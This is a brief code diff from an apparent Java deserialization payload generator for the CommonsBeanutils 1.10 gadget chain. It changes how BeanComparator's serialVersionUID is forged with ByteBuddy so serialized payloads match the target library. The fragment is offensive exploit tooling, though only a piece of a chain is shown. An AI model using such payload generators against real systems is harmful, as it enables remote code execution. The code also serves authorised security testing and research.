@@ -28,7 +28,7 @@ public class CommonsBeanutils110 implements Payload {
     public Object generate(byte[] bytes) {
         Object comparator = new ByteBuddy()
                 .redefine(BeanComparator.class)
-                .field(named("serialVersionUID"))
+                .defineField("serialVersionUID", long.class, Visibility.PRIVATE, Ownership.STATIC, FieldManifestation.FINAL)
                 .value(1L).make()
                 .load(new URLClassLoader(new URL[]{}), ClassLoadingStrategy.Default.INJECTION).getLoaded()
                 .getDeclaredConstructor(String.class, Comparator.class)
